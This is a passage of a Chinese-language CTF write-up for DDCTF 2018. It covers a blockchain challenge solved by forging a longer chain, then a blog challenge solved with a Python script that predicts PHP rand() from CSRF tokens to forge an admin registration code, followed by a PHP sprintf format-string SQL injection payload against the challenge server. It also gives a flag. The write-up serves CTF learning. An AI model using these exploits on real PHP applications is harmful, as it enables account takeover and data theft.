    "prev": "0000031ffd8d820cfaef0a73a76dabee62cfce8922e929df101eba4d2c400be8",
    "transactions": []
  }

c = string.ascii_lowercase + "0123456789ABCDEFGHI"

captchas = [''.join(i) for i in product(c, repeat=4)]

print('[+] Genering {} captchas...'.format(len(captchas)))
with open('captchas.txt', 'w') as f:
    for k in captchas:
        block["nonce"] = k
        f.write(hash_block(block)[:5] + ' --> ' + k + '\n')
```
"nonce"值是可控的，所有只要有修改nonce就可以生成任意的符合条件的区块。

## 解题
初始区块链如图所示:

 ![avatar](/images/ddctf/20180421221550.png)

然后，通过find_block_chain_tail方法，可以知道，该区块链是根据block['height']来判断最后一个区块链，如果构造一个更长的区块链，那么就可以控制整个区块链。

```
def find_blockchain_tail():
    return max(session['blocks'].values(), key=lambda block: block['height'])
```

 ![avatar](/images/ddctf/20180421222032.png)

从上边的图可以看到，如果构造3个区块，（事实上，也有一定的概率，创建两个区块就行了），那么最后一个区块就是区块6，这时候，一切都回到起点，银行又有了1000000，然后就可以转账，转账之后，在创建一个区块，就可以拿到第一个钻石,如图所示。

 ![avatar](/images/ddctf/20180421222814.png)

接下来，来获取第二个钻石。这时候，只需要在区块7之后继续创建空的区块就行了。这样，shop又有了1000000，又可以买一个钻石，然后就可以拿到flag了。

 ![avatar](/images/ddctf/20180421223014.png)

需要注意的是，flask是客户端session，区块多了之后，cookie也会变得很大，由于浏览器cookie是有限制的，这样，当set-cookie的值过大的时候，就会出现set-cookie失败的情况，所以这道题最好使用脚本发包。

# 我的博客
## 审计代码
根据提示，下载www.tar.gz,里边共有三个文件，index.php, login.php, register.php。
### index.php

```
if(isset($_GET['id'])){
    $id = addslashes($_GET['id']);
    if(isset($_GET['title'])){
        $title = addslashes($_GET['title']);
        $title = sprintf("AND title='%s'", $title);
    }else{
        $title = '';
    }
    $sql = sprintf("SELECT * FROM article WHERE id='%s' $title", $id);

    foreach ($pdo->query($sql) as $row) {
        echo "<h1>".$row['title']."</h1><br>".$row['content'];
        die();
    }
}
```
可以看到该地方使用了两次sprintf，可以立马想到[从WordPress SQLi谈PHP格式化字符串问题](https://paper.seebug.org/386/),问题就是，需要以admin的身份登录。

### login.php

```
if($_SERVER['REQUEST_METHOD'] === "POST") {
    if(!(isset($_POST['csrf']) and (string)$_POST['csrf'] === $_SESSION['csrf'])) {
        die("CSRF token error!");
    }

    $username = (isset($_POST['username']) === true && $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username');
    $password = (isset($_POST['password']) === true && $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password');

    if (strlen($username) > 32 || strlen($password) > 32) {
        die('Invalid input');
    }

    $sth = $pdo->prepare('SELECT password FROM users WHERE username = :username');
    $sth->execute([':username' => $username]);

    if ($sth->fetch()[0] !== $password) {
        die('wrong password');
    }

    $sth = $pdo->prepare('SELECT `identity` FROM users WHERE username = :username');
    $sth->execute([':username' => $username]);

    if ($sth->fetch()[0] === "admin") {
        $_SESSION['is_admin'] = true;
    } else {
        $_SESSION['is_admin'] = false;
    }

    #echo $username;
    header("Location: index.php");
}
```
login部分使用pdo进行查询，并且字符串之间的比较也是"==="，不可能存在任何漏洞。

### register.php

```
if(!(isset($_POST['csrf']) and (string)$_POST['csrf'] === $_SESSION['csrf'])) {
        die("CSRF token error!");
    }
    
    $admin = "admin###" . substr(str_shuffle('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 32);
    $username = (isset($_POST['username']) === true && $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username');
    $password = (isset($_POST['password']) === true && $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password');
    $code = (isset($_POST['code']) === true) ? (string)$_POST['code'] : '';
    if (strlen($username) > 32 || strlen($password) > 32) {
        die('Invalid input');
    }

    $sth = $pdo->prepare('SELECT username FROM users WHERE username = :username');
    $sth->execute([':username' => $username]);

    if ($sth->fetch() !== false) {
        die('username has been registered');
    }

    if($code === $admin) {
        $identity = "admin";
    } else {
        $identity = "guest";
    }

    $sth = $pdo->prepare('INSERT INTO users (username, password, `identity`) VALUES (:username, :password, :identity)');
    $sth->execute([':username' => $username, ':password' => $password, ':identity' => $identity]);

    echo '<script>alert("register success");location.href="./login.php"</script>';
} else {
```

register部分，使用str_shuffle生成admin密码，同时给出rand()来作为csrf值。

```
<input type="hidden" name="csrf" id="csrf" value="<?php $_SESSION['csrf'] = (string)rand();echo $_SESSION['csrf']; ?>" required>
<label for="inputUsername" class="sr-only">Username</label>
```

可以想到乌云的一篇文章，也是翻译自国外，原文可以自己找[Web应用隐形后门的设计与实现](https://wooyun.js.org/drops/Web%E5%BA%94%E7%94%A8%E9%9A%90%E5%BD%A2%E5%90%8E%E9%97%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0.html)。这样的话，就可以明确思路，首先通过预测rand()值，来预测密码，在使用该密码注册一个账号，进入博客，然后通过sprintf格式化漏洞获取flag。

## 解题
现在关键就是预测rand()值，通过google，可以找到0ctf2016,有相似的题目，[http://www.vuln.cn/6004](http://www.vuln.cn/6004),文中提到，只要有大于等于32个连续的rand()随机数，就可以大概预测接下来rand()的值。

```
#!php
state[i] = state[i-3] + state[i-31]
return state[i] % 2147483648
```

同时，需要知道一定要使用 requests.session来keep-alive，否则的话，获得的rand()值并不是连续的，也就不满足上面的公式了。

此外，在获得超过32个rand()值之后，并预测到接下来的62个rand()之后，还需要重新实现str_shuffle函数。通过阅读php源码，可以找到str_shuffle函数的实现。

```
static void php_string_shuffle(char *str, long len TSRMLS_DC) /* {{{ */
{
	long n_elems, rnd_idx, n_left;
	char temp;
	/* The implementation is stolen from array_data_shuffle       */
	/* Thus the characteristics of the randomization are the same */
	n_elems = len;

	if (n_elems <= 1) {
		return;
	}

	n_left = n_elems;

	while (--n_left) {
		rnd_idx = php_rand(TSRMLS_C);
		RAND_RANGE(rnd_idx, 0, n_left, PHP_RAND_MAX);
		if (rnd_idx != n_left) {
			temp = str[n_left];
			str[n_left] = str[rnd_idx];
			str[rnd_idx] = temp;
		}
	}
}

```
其中RAND_RANGE函数的实现如下:

```
#define RAND_RANGE(__n, __min, __max, __tmax) \
(__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))

```
准备工作就绪，就可以编写代码了。
代码如下:

```
import requests
from lxml import etree

url = "http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/register.php"

data = {
    'username': 'dida',
    'password': 'dida',
    'csrf': '2086003527',
    'code': ''
}

def get_csrf(html):
    html = etree.HTML(html)
    token = html.xpath('//*[@id="csrf"]')[0].get('value')
    return token


def rand_range(rand, n_left):
     return int((n_left + 1.0) * (rand / (2147483648.0)))


def shuffle(calc_rand):
    str = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    str_temp = list(str)
    str_len = len(str_temp)
    n_left = str_len - 1
    temp = ""
    while n_left:
        randdata = calc_rand[61 - n_left]
        index = rand_range(randdata, n_left)
        if index != n_left:
            temp = str_temp[n_left]
            str_temp[n_left] = str_temp[index]
            str_temp[index] = temp
        n_left = n_left - 1

    return "".join(str_temp)

while 1:
    s = requests.session()
    l = []
    for i in range(33):
        res = s.get(url)
        token = get_csrf(res.content)
        l.append(token)

    calc_rand = []
    temp_calc_rand = []
    for i in range(33, 95):
        value = (int(l[i - 31]) + int(l[i-3])) % 2147483648
        l.append(value)
        temp_calc_rand.append(value)

    str = "admin###" + shuffle(temp_calc_rand)[0:32]
    data['code'] = str
    data['csrf'] = l[32]

    res = s.post(url = url, data = data)
    print(res.content)
    break
```
运行上边的代码，就可以注册一个账号，至于该账号是不是admin,多试几次总会成功。

登陆之后，就可以使用sprintf字符串格式化漏洞来进行sql注入。这个就不在赘述了。
基本的payload如下:
>http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/index.php?id=%1$&title=%1$' or 2=1 union select 1,2,3%23

最后得到flag: ```DDCTF{9b7ccc1e96387b5ce079adab2fb08022}```

